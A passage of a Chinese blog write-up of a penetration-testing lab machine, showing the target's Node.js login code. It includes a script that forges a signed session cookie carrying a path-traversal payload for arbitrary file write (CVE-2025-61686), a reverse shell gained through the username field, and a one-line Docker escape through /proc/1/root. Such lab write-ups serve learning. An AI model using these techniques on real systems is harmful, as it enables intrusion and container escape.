/login</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/login&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">await</span> <span class="title function_">getBody</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> user = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (username === <span class="variable constant_">ADMIN_USER</span>.<span class="property">username</span> &amp;&amp; password === <span class="variable constant_">ADMIN_USER</span>.<span class="property">password</span>) &#123;</span><br><span class="line">      user = <span class="variable constant_">ADMIN_USER</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123;</span><br><span class="line">      session.<span class="title function_">set</span>(<span class="string">&quot;userId&quot;</span>, user.<span class="property">username</span>);</span><br><span class="line">      session.<span class="title function_">set</span>(<span class="string">&quot;role&quot;</span>, user.<span class="property">role</span> || <span class="string">&quot;user&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/dashboard&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;凭证无效 🥀&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /register</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/register&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;🌻 注册&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;flashError ? <span class="string">`&lt;div class=&quot;error&quot;&gt;<span class="subst">$&#123;flashError&#125;</span>&lt;/div&gt;`</span> : <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/register&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;设置用户名&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;设置密码&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot;&gt;加入俱乐部&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;&lt;a href=&quot;/login&quot;&gt;已有账号？去登录&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Register&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST /register</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/register&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> body = <span class="keyword">await</span> <span class="title function_">getBody</span>(req);</span><br><span class="line">    <span class="keyword">const</span> &#123; username, password &#125; = body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username) || username === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;用户名已被占用 🌵&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/register&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;user&quot;</span> &#125;);</span><br><span class="line">    session.<span class="title function_">flash</span>(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;注册成功！请登录 🌹&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST /logout</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/logout&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">destroySession</span>(session));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /dashboard (受保护页面)</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/dashboard&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = session.<span class="title function_">get</span>(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> role = session.<span class="title function_">get</span>(<span class="string">&quot;role&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!userId) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> adminContent = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (role === <span class="string">&quot;admin&quot;</span> || userId === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      adminContent = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;background: #ffe6e6; border: 2px solid red; padding: 10px; margin-top: 10px;&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;h3&gt;👑 管理员面板&lt;/h3&gt;</span></span><br><span class="line"><span class="string">          &lt;p&gt;&lt;strong&gt;Secret Flag:&lt;/strong&gt; FLAG&#123;FLOWER_POWER_OVERFLOW&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">          &lt;p&gt;你已获得花园的完全控制权。&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;花园仪表盘 🌼&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;你好, &lt;strong&gt;<span class="subst">$&#123;userId&#125;</span>&lt;/strong&gt;!&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;dashboard-content&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;当前身份: &lt;strong&gt;<span class="subst">$&#123;role === <span class="string">&#x27;admin&#x27;</span> ? <span class="string">&#x27;首席园丁 👒&#x27;</span> : <span class="string">&#x27;访客 🐝&#x27;</span>&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;享受这宁静的氛围吧...&lt;/p&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;adminContent&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/logout&quot; style=&quot;margin-top: 20px;&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot; style=&quot;background: #999;&quot;&gt;退出登录&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Dashboard&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    <span class="comment">// 如果 Session 没有变化则不需要 commit，但为了刷新过期时间通常建议 commit</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 404</span></span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain; charset=utf-8&quot;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;页面未找到&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🌸 Flower Server running on http://localhost:3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里给了一个假的flag而且这里对应的是3000的源码，所以尝试去审计看看3000的漏洞点，然后我没怎么学过js所以这里是和ai一起做的审计</p>
+<p>这里知道是可以通过session去实现任意文件写入的，但是一开始我一直写不进去，后面找了一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91265">CVE-2025-61686-React Router 任意文件写入漏洞——从代码层面分析漏洞成因-先知社区</a></p>
+<p>当然还感谢Sublarge耐心看我的思路，最后我将我的操作完整给他看了一遍，他说逻辑上没错误。但正是我将问题描述了一遍使得我开始重新认真分析这个问题，最后发现问题。</p>
+<p>所以遇到问题的时候自己先尝试将问题描述清楚再去思路！</p>
+<p><strong>漏洞的利用</strong>:</p>
+<p>这里就先成为脚本小子了，分析的话，我感觉后面可以专门去搞一搞</p>
+<p>写一个伪造session的脚本（自己验证了是正确的）：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remix-sign.js</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="string">&quot;mazesec&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> encoded = <span class="string">&quot;IjE3YjVhNjM0NGFhYTY2OTk3Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL29wdC9mbG93ZXIuc2gi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. HMAC-SHA256，输出普通 base64</span></span><br><span class="line"><span class="keyword">let</span> sig = crypto</span><br><span class="line">  .<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable constant_">SECRET</span>)</span><br><span class="line">  .<span class="title function_">update</span>(encoded)</span><br><span class="line">  .<span class="title function_">digest</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终 cookie 值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;encoded&#125;</span>.<span class="subst">$&#123;sig&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个session前半部分是base64加密，后半部分是签名，所以我们只要保证签名正确就好了，而且写入session文件是在登录的时候，所以我们注册一个用户（用户名为反弹shell的命令），然后登录的时候改一下session进行登录。</p>
+<p><img src="/../images/achieve/2026/1/image-20260221212621647.png" alt="image-20260221212621647"></p>
+<p>这里还用到了shell脚本里面<code>$&#123;&#125;</code>变量替换，当然命令替换也可以就是反引号。那么就拿到shell了</p>
+<h2 id="rootflag-docker逃逸"><a href="#rootflag-docker逃逸" class="headerlink" title="rootflag(docker逃逸)"></a>rootflag(docker逃逸)</h2><p>接下来就是docker逃逸了，这玩意我从来没接触过，但是我又特别想把它干出来，所以我去网上搜文章。尝试了几种方法都不行，那么试试工具呗！cdk走起，最后在ai和工具的辅助下我成功逃逸了</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import os; os.chroot(&quot;/proc/1/root&quot;); os.chdir(&quot;/&quot;); os.system(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么这个就是我后面要学习的东西！！！</p>
+<p>&#x2F;root下面没有flag，flag被藏起来了！没想到在这遇到了111，提示我用linpeas扫描一遍！</p>
+<p><img src="/../images/achieve/2026/1/image-20260221220307073.png" alt="image-20260221220307073"></p>
+<p>这里说是现在的&#x2F;root是被挂载了，所以猜测flag在没挂载前</p>
+<p><img src="/../images/achieve/2026/1/image-20260221222338714.png" alt="image-20260221222338714"></p>
+<p>这里明明是root了，但是还是不能，有些奇怪！</p>
+<p>然后还发现了这么个奇怪的玩意，然后但是我的ip正好是10</p>
+<p><img src="/../images/achieve/2026/1/image-20260221222536181.png" alt="image-20260221222536181"></p>
+<p>但是现在也可以改，这应该就是真root了吧</p>
+<p><img src="/../images/achieve/2026/1/image-20260221223158606.png" alt="image-20260221223158606"></p>
+<p>一些总结，这可以说是我第一次接触这种靶机的渗透，user那个flag还好，因为打过ctf，但是docker逃逸相关的东西我是从未接触过。但是通过我的快速了解和ai的辅助和111&amp;Sublarge的一些提示，最终耗时5个小时左右拿下我的<strong>第一台</strong>机子!!!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/about/">ab0ut</a></li>
+        
+          <li><a href="/categories/">categ0ries</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag-%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">userflag(打点)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag-docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">rootflag(docker逃逸)</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&text=Hiflower靶机"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&is_video=false&description=Hiflower靶机"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hiflower靶机&body=Check out this article: https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&name=Hiflower靶机&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&t=Hiflower靶机"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Rufeii
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/tags/">tags</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
+      </ul>
+      <ul>
+            
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+              
+            
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</body>
+</html>
